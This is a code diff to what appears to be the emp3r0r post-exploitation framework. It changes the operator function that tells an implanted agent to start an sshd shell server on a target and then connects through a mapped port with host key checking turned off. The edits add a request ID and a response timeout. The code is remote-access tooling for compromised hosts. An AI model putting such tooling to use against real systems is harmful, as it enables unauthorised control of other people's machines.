@@ -9,6 +9,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -66,7 +67,7 @@ func SSHClient(shell, args, port string) (err error) {
 
 	if !exists {
 		// start sshd server on target
-		cmd := fmt.Sprintf("!sshd %s %s %s", shell, port, args)
+		cmd := fmt.Sprintf("!sshd %s %s %s %s", uuid.NewString(), shell, port, args)
 		err = SendCmdToCurrentTarget(cmd)
 		if err != nil {
 			return
@@ -79,10 +80,12 @@ func SSHClient(shell, args, port string) (err error) {
 			delete(CmdResults, cmd)
 			CmdResultsMutex.Unlock()
 		}()
-		for {
+		is_response := false
+		res := ""
+		for i := 0; i < 100; i++ {
 			time.Sleep(100 * time.Millisecond)
-			res, exists := CmdResults[cmd]
-			if exists {
+			res, is_response = CmdResults[cmd]
+			if is_response {
 				if strings.Contains(res, "success") {
 					break
 				} else {
@@ -90,6 +93,10 @@ func SSHClient(shell, args, port string) (err error) {
 					return
 				}
 			}
+		}
+		if !is_response {
+			err = fmt.Errorf("Didn't get response from agent (%s), aborting", CurrentTarget.Tag)
+			return
 		}
 
 		// set up port mapping for the ssh session
@@ -137,9 +144,9 @@ wait:
 	}
 	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
 		sshPath, lport)
-	CliPrintSuccess("Opening SSH (%s - %s) session for %s in new window. "+
-		"If that fails, please execute command %s manaully",
-		shell, port, CurrentTarget.Tag, strconv.Quote(sshCmd))
+	CliPrintSuccess("Opening SSH (%s - %s) session for %s in new window.\n"+
+		"If that fails, please execute command\n%s\nmanaully",
+		shell, port, CurrentTarget.Tag, sshCmd)
 
 	// agent name
 	name := CurrentTarget.Hostname
